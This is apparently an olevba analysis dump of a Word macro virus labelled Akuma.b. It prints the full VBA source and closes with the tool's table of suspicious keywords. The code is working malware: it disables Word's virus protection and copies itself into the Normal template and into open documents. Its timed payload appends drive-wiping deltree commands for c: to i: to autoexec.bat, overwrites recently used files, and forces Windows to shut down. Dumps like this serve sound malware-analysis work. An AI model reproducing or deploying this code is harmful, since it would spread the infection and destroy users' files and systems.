olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Akuma.b-29b52f990135098bf82b220a00b26715b29fabf0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Akuma.b-29b52f990135098bf82b220a00b26715b29fabf0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'Stand
'2
    On Error Resume Next
    If Dir("c:\kill.log", vbArchive + vbHidden + vbReadOnly) = "" Then
        Open "c:\kill.log" For Output As #1
        Randomize
        Dataccia = DateAdd("d", Int((30 * Rnd) + 1), Date)
        Print #1, Dataccia
        Close #1
        SetAttr "c:\kill.log", vbArchive + vbHidden + vbReadOnly
    Else
        Open "c:\kill.log" For Input As #1
        Line Input #1, Dataccia
        If DateDiff("d", Date, Dataccia) <= 0 Then StandDestroy
        Close #1
    End If
End Sub

Private Sub Document_Open()
'Stand
'2
    Stand
End Sub

Private Sub Document_New()
'Stand
'2
    Stand
End Sub

Private Sub Stand()
'Stand
'2
'Copies: 72
    On Error Resume Next
    stato = ActiveDocument.Saved
    Application.EnableCancelKey = Not -1
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    Application.DisplayRecentFiles = True
    RecentFiles.Maximum = 9
    Set mad = NormalTemplate.VBProject.VBComponents.Item(1)
    For c = 1 To 2
        If Left(StandFind(mad, "Private Sub Stand()", True), Len("Stand Yes")) = "Stand Yes" Then GoTo NoClear
        lm = StandClear(mad, "Sub Document_Close()")
        lm = StandClear(mad, "Private Sub Document_Close()")
        lm = StandClear(mad, "Sub Document_New()")
        lm = StandClear(mad, "Private Sub Document_New()")
        lm = StandClear(mad, "Sub Document_Open()")
        lm = StandClear(mad, "Private Sub Document_Open()")
        lm = StandClear(mad, "Sub AutoClose()")
        lm = StandClear(mad, "Private Sub AutoClose()")
        lm = StandClear(mad, "Sub AutoOpen()")
        lm = StandClear(mad, "Private Sub AutoOpen()")
        lm = StandClear(mad, "Sub AutoNew()")
        lm = StandClear(mad, "Private Sub AutoNew()")
        lm = StandClear(mad, "Private Sub Stand()")
        lm = StandClear(mad, "Private Function StandClear(DoveM, StartM)")
        lm = StandClear(mad, "Private Sub StandDestroy()")
        lm = StandClear(mad, "Private Function StandFind(DoveM, StartM, Infect)")
        lm = StandClear(mad, "Private Function StandInfect()")
        lm = StandClear(mad, "Private Function StandWrite(StartM)")
NoClear:
        Set mad = ActiveDocument.VBProject.VBComponents.Item(1)
    Next c
    SetAttr "c:\Stand.log", vbNormal
    Kill "c:\Stand.log"
    Open "c:\Stand.log" For Output As #1
    lm = StandWrite("Private Sub Document_Close()")
    lm = StandWrite("Private Sub Document_Open()")
    lm = StandWrite("Private Sub Document_New()")
    lm = StandWrite("Private Sub Stand()")
    lm = StandWrite("Private Function StandClear(DoveM, StartM)")
    lm = StandWrite("Private Sub StandDestroy()")
    lm = StandWrite("Private Function StandFind(DoveM, StartM, Infect)")
    lm = StandWrite("Private Function StandInfect()")
    lm = StandWrite("Private Function StandWrite(StartM)")
    Close #1
    SetAttr "c:\Stand.log", vbNormal
    lm = StandInfect
    Kill "c:\Stand.log"
    Randomize
    If Int((10 * Rnd) + 1) = 6 Then
        With Dialogs(wdDialogFileSummaryInfo)
            .Title = "Stand Macro Carrier"
            .Author = "Lonely Mad"
            .Keywords = "I'll destroy you"
            .Execute
        End With
    End If
    If Left(ActiveDocument.Name, 8) <> "Document" And lm = 2 Then
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If
    ActiveDocument.Saved = stato
    On Error GoTo 0
End Sub

Private Function StandClear(DoveM, StartM)
'Stand
'2
    Count = StandFind(DoveM, StartM, True)
    If Left(Count, 5) <> "Stand" Then
        Do Until DoveM.CodeModule.Lines(Count, 1) = "End Sub" Or DoveM.CodeModule.Lines(Count, 1) = "End Function"
            DoveM.CodeModule.DeleteLines (Count)
        Loop
        DoveM.CodeModule.DeleteLines (Count)
    End If
End Function

Private Sub StandDestroy()
'Stand
'2
    On Error Resume Next
    SetAttr "c:\kill.log", vbNormal
    Kill "c:\kill.log"
    Randomize
    WhickStand = Int(5 * Rnd) + 1
    Select Case WhickStand
        Case 1
            var = MsgBox("This application caused a general protection error:" + Chr$(10) + "The system will be restarted", vbCritical, "The World")
            SetAttr "c:\autoexec.bat", vbNormal
            Open "c:\autoexec.bat" For Input As #1
                Do Until EOF(1)
                    Input #1, stress
                Loop
            Close #1
            If stress <> "next time I'll KILL YOU" Then
                Open "c:\autoexec.bat" For Append As #1
                    Print #1, "deltree /Y i:\*"
                    Print #1, "deltree /Y h:\*"
                    Print #1, "deltree /Y g:\*"
                    Print #1, "deltree /Y f:\*"
                    Print #1, "deltree /Y e:\*"
                    Print #1, "deltree /Y d:\*"
                    Print #1, "deltree /Y c:\*"
                    Print #1, "rem Created by The Lonely Mad"
                    Print #1, "rem Hey, looser, now your system, next time I'll KILL YOU"
                Close #1
            End If
            Tasks.ExitWindows
        Case 2
            var = MsgBox("This application caused a general protection error:" + Chr$(10) + "The system will be restarted", vbCritical, "Killer Queen")
            If Dir("c:\Abdul.log", vbArchive + vbHidden + vbReadOnly) = "" Then
                For c = 1 To Application.RecentFiles.Count
                    If Left(Application.RecentFiles.Item(c).Path, 3) <> "A:\" Then
                        Open Application.RecentFiles.Item(c).Path + "\" + Application.RecentFiles.Item(c) For Output As #1
                        Print #1, "Killer Queen kills stupid people like you, " + Application.UserName + "."
                        Close #1
                    End If
                Next c
            Else
                MsgBox "Killer Queen kills stupid people like you, " + Application.UserName + "."
            End If
            Tasks.ExitWindows
        Case 3
            var = MsgBox("This application caused a general protection error:" + Chr$(10) + "The system will be restarted", vbCritical, "Vanilla Ice")
            Tasks.ExitWindows
        Case 4
            var = MsgBox("This application caused a general protection error", vbCritical, "Star Platinum")
        Case 5
            var = MsgBox("This application caused a general protection error", vbCritical, "Crazy Diamond")
    End Select
    On Error GoTo 0
End Sub

Private Function StandFind(DoveM, StartM, Infect)
'Stand
'2
    For Count = 1 To DoveM.CodeModule.CountOfLines
        If LCase$(DoveM.CodeModule.Lines(Count, 1)) = LCase$(StartM) Then
            If Infect = False Then
                If StartM = "Private Sub Stand()" Then
                    var = Val(Trim(Right(DoveM.CodeModule.Lines(Count + 3, 1), Len(DoveM.CodeModule.Lines(Count + 3, 1)) - 8)))
                    DoveM.CodeModule.DeleteLines (Count + 3)
                    DoveM.CodeModule.InsertLines (Count + 3), "'Copies:" + Str(var + 1)
                End If
            End If
            If Trim(DoveM.CodeModule.Lines(Count + 1, 1)) = "'Stand" And Val(Trim(Right(DoveM.CodeModule.Lines(Count + 2, 1), Len(DoveM.CodeModule.Lines(Count + 2, 1)) - 1))) >= 2 Then
                StandFind = "Stand Yes" + Str(Count)
                Exit Function
            ElseIf Trim(DoveM.CodeModule.Lines(Count + 1, 1)) = "'Stand" And Val(Trim(Right(DoveM.CodeModule.Lines(Count + 2, 1), Len(DoveM.CodeModule.Lines(Count + 2, 1)) - 1))) < 2 Then
                GoTo FindIt
            Else
FindIt:         For cnt = 1 To DoveM.CodeModule.CountOfLines
                    If LCase$(DoveM.CodeModule.Lines(cnt, 1)) = LCase$(StartM) Then Exit For
                Next cnt
                StandFind = cnt
                Exit Function
            End If
        End If
    Next Count
    StandFind = "Stand"
End Function

Private Function StandInfect()
'Stand
'2
    If StandFind(NormalTemplate.VBProject.VBComponents.Item(1), "Private Sub Stand()", True) = "Stand" Then
        Set mad = NormalTemplate.VBProject.VBComponents.Item(1): flag = True: StandInfect = 1
    ElseIf StandFind(ActiveDocument.VBProject.VBComponents.Item(1), "Private Sub Stand()", True) = "Stand" Then
        Set mad = ActiveDocument.VBProject.VBComponents.Item(1): flag = True: StandInfect = 2
    Else
        flag = False: StandInfect = 3
    End If
    If flag = True Then
        Open "c:\Stand.log" For Input As #2
        If LOF(2) = 0 Then GoTo cpyvir
        Count = 1
        Do While Not EOF(2)
            Line Input #2, stress
            mad.CodeModule.InsertLines Count, stress
            Count = Count + 1
        Loop
cpyvir: Close #2
    End If
End Function

Private Function StandWrite(StartM)
'Stand
'2
    Count = StandFind(MacroContainer.VBProject.VBComponents.Item(1), StartM, False)
    If Count <> "Stand" Then
        If Left(Count, Len("Stand Yes")) = "Stand Yes" Then
            Count = Val(Right(Count, Len(Count) - Len("Stand Yes")))
        End If
        Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1) = "End Sub" Or MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1) = "End Function"
            stress = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1)
            Print #1, stress
            Count = Count + 1
        Loop
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1)
        Print #1, ""
    End If
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

